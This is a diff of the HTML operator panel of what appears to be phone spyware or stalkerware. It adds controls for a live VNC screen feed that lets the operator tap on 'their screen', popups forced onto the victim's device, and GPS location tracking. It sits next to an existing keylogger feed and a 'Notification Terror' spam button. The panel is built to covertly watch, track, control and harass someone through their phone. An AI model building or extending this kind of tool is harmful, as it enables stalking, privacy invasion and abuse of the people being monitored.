@@ -86,6 +86,12 @@
                     </div>
                     
                     <button class="btn danger full-width" style="margin-top: 10px;" onclick="sendCommand('spam_notifs', null)">Notification Terror</button>
+
+                    <h4 style="margin-top: 15px; margin-bottom: 5px;">Floating Popups</h4>
+                    <div class="btn-group">
+                        <button class="btn primary" onclick="sendCommand('spawn_popup', { url: window.lastUploadedMedia })">Spawn Image</button>
+                        <button class="btn danger" onclick="sendCommand('kill_popups', null)">Kill All</button>
+                    </div>
                 </div>
                 
                 <!-- NEW: Behavioral Modifiers -->
@@ -107,28 +113,42 @@
                 </div>
                 
                 <!-- NEW: C2 Omnipotence Core -->
-                <div class="card span-2" style="border-color: var(--amethyst);">
-                    <h3 style="color:var(--text-primary);">Spyware Protocol</h3>
+                <div class="card span-3" style="border-color: var(--amethyst);">
+                    <h3 style="color:var(--text-primary);">Spyware Protocol & Live VNC</h3>
                     
-                    <div style="display:flex; justify-content:space-between; gap:20px;">
-                        <div style="flex:1;">
+                    <div style="display:flex; justify-content:space-between; gap:20px; flex-wrap: wrap;">
+                        <div style="flex:1; min-width: 250px;">
                             <h4 style="color:var(--amethyst); margin-bottom:10px;">Device Navigation</h4>
                             <div class="btn-group">
                                 <button class="btn" onclick="sendCommand('remote_action', { action: 'home' })">Force HOME</button>
                                 <button class="btn" onclick="sendCommand('remote_action', { action: 'back' })">Force BACK</button>
                                 <button class="btn" onclick="sendCommand('remote_action', { action: 'recents' })">Force RECENTS</button>
                             </div>
+                            
+                            <h4 style="color:var(--neon-pink); margin-top:20px; margin-bottom:10px;">Location Tracking (GPS)</h4>
+                            <button class="btn primary full-width" onclick="sendCommand('get_location', null)">Request Coordinates</button>
+                            <div id="gps-result" style="margin-top:10px; font-size:0.85em; color:#fff;"></div>
                         </div>
                         
-                        <div style="flex:1; border-left:1px solid rgba(255,255,255,0.1); padding-left:20px;">
-                             <h4 style="color:var(--neon-pink); margin-bottom:10px;">Location Tracking (GPS)</h4>
-                             <button class="btn primary full-width" onclick="sendCommand('get_location', null)">Request Coordinates</button>
-                             <div id="gps-result" style="margin-top:10px; font-size:0.85em; color:#fff;"></div>
+                        <div style="flex:2; min-width: 300px; border-left:1px solid rgba(255,255,255,0.1); padding-left:20px;">
+                             <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                                 <h4 style="color:#0f6; margin:0;">Live Screen Feed (VNC)</h4>
+                                 <div>
+                                     <button class="btn primary" onclick="startStream()">Start Stream</button>
+                                     <button class="btn danger" onclick="stopStream()">Stop</button>
+                                 </div>
+                             </div>
+                             
+                             <div id="vnc-container" style="position: relative; width: 100%; max-width: 350px; margin: 0 auto; border: 2px solid #0f6; border-radius: 8px; overflow: hidden; aspect-ratio: 9/19; background: #000; cursor: crosshair;" onclick="handleVncClick(event)">
+                                 <img id="vnc-screen" src="" style="width: 100%; height: 100%; object-fit: contain; pointer-events: none;" alt="Waiting for stream..."/>
+                                 <div id="vnc-overlay" style="position: absolute; top:50%; left:0; width:100%; text-align:center; color: #0f6; font-family: monospace; pointer-events: none;">NO SIGNAL<br>Click Start Stream</div>
+                             </div>
+                             <p style="font-size: 0.8em; color: gray; text-align: center; margin-top: 5px;">Click anywhere on the stream above to simulate a tap on their screen.</p>
                         </div>
                     </div>
                 </div>
 
-                <div class="card span-3" style="border-color: #ff105f;">
+                <div class="card span-1" style="border-color: #ff105f;">
                     <h3 style="color:#ff105f;">Live Keylogger Feed</h3>
                     <div id="keylogger-feed" style="height: 150px; background: rgba(0,0,0,0.8); border-radius: 5px; padding: 10px; overflow-y: auto; font-family: monospace; font-size: 0.85em; color: lime;">
                         > Waiting for interception...
